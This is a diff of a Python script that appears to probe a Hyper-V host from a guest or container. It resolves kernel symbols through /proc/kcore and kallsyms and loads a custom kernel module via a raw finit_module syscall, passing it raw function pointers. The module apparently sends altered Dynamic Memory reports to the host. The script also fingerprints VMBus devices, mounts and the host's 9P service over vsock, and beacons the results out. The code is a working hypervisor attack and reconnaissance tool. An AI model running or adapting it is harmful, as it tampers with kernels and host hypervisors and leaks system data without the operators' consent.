@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Bounded Dynamic Memory control: induce one stock balloon/unballoon cycle."""
+"""Definitive A-only Dynamic Memory policy gate."""
 
 import base64
 import ctypes
@@ -7,12 +7,22 @@ import glob
 import json
 import os
 import re
+import socket
 import struct
 import time
 import urllib.parse
 import urllib.request
 
 DM_CLASS = "{525074dc-8985-46e2-8057-a307dc18a502}"
+VSMB_CLASS = "{4d12e519-17a0-4ae4-8eaa-5270fc6abdb7}"
+VMIC_CLASSES = {
+    "shutdown": "{0e0b6031-5213-4934-818b-38d90ced39db}",
+    "time_sync": "{9527e630-d0ae-497b-adce-e80ab0175caf}",
+    "heartbeat": "{57164f39-9115-4e78-ab55-382f3bd5422d}",
+    "data_exchange": "{a9a0f4e7-5a45-4d96-b827-8a841e8c03e6}",
+    "backup": "{35fa2e29-ea23-4236-96ae-3a6ebacba440}",
+    "guest_services": "{34d14be3-dee4-41c8-9ae7-6b174977c192}",
+}
 MODULE = "/tmp/hvraw_dm_status.ko"
 PROC = "/hostproc"
 SYS = "/hostsys"
@@ -40,11 +50,12 @@ class KCore:
         raise ValueError("address outside kcore loads")
 
 
-def symbol_address(name):
+def symbol_address(name, symbol_types="t"):
     with open(PROC + "/kallsyms") as stream:
         for line in stream:
             fields = line.split()
-            if len(fields) >= 3 and fields[2] == name and fields[1].lower() == "t":
+            if (len(fields) >= 3 and fields[2] == name and
+                    fields[1].lower() in symbol_types):
                 return int(fields[0], 16)
     raise KeyError(name)
 
@@ -85,11 +96,13 @@ def channel_for_relid(kcore, relid):
     return candidates[0]
 
 
-def load_module():
+def load_module(channel, send, balloon_up):
     libc = ctypes.CDLL(None, use_errno=True)
     fd = os.open(MODULE, os.O_RDONLY)
+    parameters = ("channel=%#x send_fn=%#x balloon_up_fn=%#x reports=5" %
+                  (channel, send, balloon_up)).encode()
     try:
-        result = libc.syscall(313, fd, b"", 3)
+        result = libc.syscall(313, fd, parameters, 3)
         error = ctypes.get_errno() if result else 0
     finally:
         os.close(fd)
@@ -126,21 +139,91 @@ def read_trace(root):
     return values
 
 
-def write_param(name, value):
-    open(SYS + "/module/hvraw_dm_status/parameters/" + name, "w").write(
-        str(value) + "\n")
+def read_param(name):
+    return int(open(SYS + "/module/hvraw_dm_status/parameters/" + name).read())
 
 
-def send_phase(available, committed):
-    write_param("available", available)
-    write_param("committed", committed)
-    write_param("burst", 20)
-    write_param("interval_ms", 50)
+def public_census():
+    devices = []
+    for path in sorted(glob.glob(SYS + "/bus/vmbus/devices/*")):
+        relids = sorted(int(os.path.basename(channel)) for channel in
+                        glob.glob(path + "/channels/*"))
+        driver_path = os.path.realpath(path + "/driver")
+        devices.append({
+            "class_id": open(path + "/class_id").read().strip().lower(),
+            "device_id": open(path + "/device_id").read().strip().lower(),
+            "driver": (os.path.basename(driver_path) if
+                       os.path.exists(path + "/driver") else "unbound"),
+            "relids": relids,
+        })
+
+    filesystems = {}
+    for label, mountinfo in (("init", PROC + "/1/mountinfo"),
+                             ("root_helper", PROC + "/self/mountinfo")):
+        kinds = set()
+        with open(mountinfo) as stream:
+            for line in stream:
+                tail = line.partition(" - ")[2].split()
+                if tail:
+                    kinds.add(tail[0])
+        filesystems[label] = sorted(kinds)
+    advertised = {device["class_id"] for device in devices}
+    return {
+        "devices": devices,
+        "filesystem_types": filesystems,
+        "vsmb_vmusrv": VSMB_CLASS in advertised,
+        "vmic_services": sorted(name for name, guid in VMIC_CLASSES.items()
+                                if guid in advertised),
+    }
+
+
+def recv_exact(stream, length):
+    chunks = []
+    while length:
+        chunk = stream.recv(length)
+        if not chunk:
+            raise EOFError("short response")
+        chunks.append(chunk)
+        length -= len(chunk)
+    return b"".join(chunks)
+
+
+def plan9_version_census():
+    """Test only the standard LCOW host-side 9P version handshake."""
+    if not hasattr(socket, "AF_VSOCK"):
+        return {"status": "af_vsock_unavailable"}
+
+    version = b"9P2000.L"
+    request_size = 4 + 1 + 2 + 4 + 2 + len(version)
+    request = (struct.pack("<IBHIH", request_size, 100, 0xffff, 8192,
+                           len(version)) + version)
     try:
-        write_param("arm", 1)
-        return 0
-    except OSError as error:
-        return error.errno
+        with socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM) as stream:
+            stream.settimeout(2)
+            try:
+                stream.connect((2, 564))
+            except OSError as error:
+                return {"status": "connect_error", "errno": error.errno}
+            stream.sendall(request)
+            size = struct.unpack("<I", recv_exact(stream, 4))[0]
+            if size < 7 or size > 8192:
+                return {"status": "invalid_size", "size": size}
+            response = recv_exact(stream, size - 4)
+            message_type, tag = struct.unpack("<BH", response[:3])
+            result = {"message_type": message_type, "size": size,
+                      "tag": tag}
+            if message_type != 101 or len(response) < 9:
+                return {**result, "status": "unexpected_response"}
+            msize, version_length = struct.unpack("<IH", response[3:9])
+            if len(response) != 9 + version_length:
+                return {**result, "status": "invalid_version_length",
+                        "msize": msize,
+                        "version_length": version_length}
+            return {**result, "status": "rversion", "msize": msize,
+                    "version": response[9:].decode("ascii", "replace")}
+    except (OSError, EOFError, struct.error) as error:
+        return {"status": "io_error", "errno": getattr(error, "errno", None),
+                "error": type(error).__name__}
 
 
 def beacon(result):
@@ -164,15 +247,15 @@ def main():
     pressure_path = SYS + "/module/hv_balloon/parameters/pressure_report_delay"
     pressure_was = None
     try:
+        result.update(kernel=os.uname().release, census=public_census(),
+                      plan9=plan9_version_census())
+        beacon({**result, "status": "public_census"})
         relid, device = primary_relid()
         kcore = KCore(PROC + "/kcore")
         channel = channel_for_relid(kcore, relid)
         send = symbol_address("vmbus_sendpacket")
-        result.update(relid=relid, device=device, channel=hex(channel),
-                      send_fn=hex(send), kernel=os.uname().release)
-        load_module()
-        write_param("channel", hex(channel))
-        write_param("send_fn", hex(send))
+        balloon_up = symbol_address("balloon_up")
+        result.update(relid=relid, device=device)
         if os.path.exists(pressure_path):
             pressure_was = open(pressure_path).read().strip()
             open(pressure_path, "w").write("0\n")
@@ -192,46 +275,28 @@ def main():
             result.update(status="ambiguous_existing_balloon_state")
             return
 
+        load_module(channel, send, balloon_up)
+        deadline = time.monotonic() + 15
         peak = baseline["ballooned"]
-        trigger_delta = None
-        sends = []
-        # Descend gradually so the first host request is bounded rather than
-        # asking the stock driver to surrender the whole guest.
-        for delta in (baseline["committed"],):
-            low = max(0, baseline["committed"] - delta)
-            for _ in range(8):
-                sends.append({"phase": "low", "delta": delta,
-                              "errno": send_phase(baseline["available"] + delta,
-                                                   low)})
-                latest = read_trace(root)[-1]
-                peak = max(peak, latest["ballooned"])
-                if peak > baseline["ballooned"]:
-                    trigger_delta = delta
-                    break
-            if trigger_delta is not None:
-                break
+        while time.monotonic() < deadline and read_param("mutated") < 5:
+            time.sleep(0.25)
+            peak = max(peak, read_trace(root)[-1]["ballooned"])
 
-        result.update(peak_ballooned=peak, trigger_delta=trigger_delta)
-        if trigger_delta is None:
-            result.update(status="no_balloon_request", sends=sends[-8:])
-            return
-
-        # High committed pressure is guest-controlled and asks the balancer
-        # to restore the pages it just removed. It remains below MemTotal-like
-        # committed+available and avoids an absurd/malformed u64.
-        high = baseline["committed"] + baseline["available"]
+        # Give the host a few balancing ticks after the fifth unmodified-ID,
+        # genuine-cadence report. The receiver probe only observes balloon_up.
+        time.sleep(4)
+        mutations = read_param("mutated")
+        receiver = read_param("receiver_requests")
         final = read_trace(root)[-1]
-        for _ in range(20):
-            sends.append({"phase": "high",
-                          "errno": send_phase(0, high)})
-            final = read_trace(root)[-1]
-            if final["ballooned"] <= baseline["ballooned"]:
-                break
-
-        result.update(status=("cycle_complete" if
-                              final["ballooned"] <= baseline["ballooned"]
-                              else "balloon_only"),
-                      final=final, high_committed=high, sends=sends[-12:])
+        peak = max(peak, final["ballooned"])
+        result.update(mutations=mutations, receiver_type6=receiver,
+                      peak_ballooned=peak, final=final)
+        if mutations != 5:
+            result.update(status="incomplete_stock_status_gate")
+        elif receiver:
+            result.update(status="receiver_type6")
+        else:
+            result.update(status="fixed_or_no_balloon_policy")
     except Exception as error:
         result.update(status="error", error="%s:%s" %
                       (type(error).__name__, error))
